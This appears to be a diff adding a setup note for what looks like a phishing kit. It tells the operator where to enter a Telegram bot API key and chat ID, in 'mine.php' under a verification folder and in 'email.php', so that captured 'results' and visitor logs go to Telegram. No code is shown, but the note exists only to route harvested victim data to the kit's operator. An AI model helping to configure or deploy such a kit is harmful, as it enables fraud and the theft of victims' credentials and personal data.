@@ -1,0 +1,13 @@
+//to receive results on telegram
+ 
+go to     verification -> extra -> mine.php
+
+ and put your bot api and chatID 
+
+// to recieve your log (visits) on telegram 
+
+just edit email.php file and put your bot api and chatID 
+
+if you want to disable visits just leave the api and chatID fields empty.
+	
+
